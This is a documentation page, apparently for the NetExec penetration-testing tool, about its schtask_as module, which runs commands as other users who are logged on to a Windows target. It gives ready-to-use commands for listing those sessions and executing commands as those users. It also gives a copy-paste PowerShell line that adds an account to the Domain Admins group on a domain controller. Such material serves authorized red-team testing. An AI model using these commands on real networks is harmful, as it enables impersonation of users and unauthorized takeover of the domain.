---
description: >-
  Use Sessions from logged-on Users to execute arbitrary commands using
  schtask_as
---

# 🆕 Impersonate logged-on Users



{% hint style="warning" %}
You need at least local admin privilege on the remote target
{% endhint %}

The Module schtask\_as can execute commands on behalf on other users which has sessions on the target, thanks to the contribution from [@Defte\_](https://twitter.com/Defte\_).

### 1. Enumerate logged-on users on your Target

```
nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users
```

### 2. Execute commands on behalf of other users

```
nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>
```

<figure><img src="../.gitbook/assets/schtask_as.png" alt=""><figcaption></figcaption></figure>

Custom command to add an user to the domain admin group for easy copy\&pasting:&#x20;

```
powershell.exe \"Invoke-Command -ComputerName DC01 -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members USER.NAME}\"
```
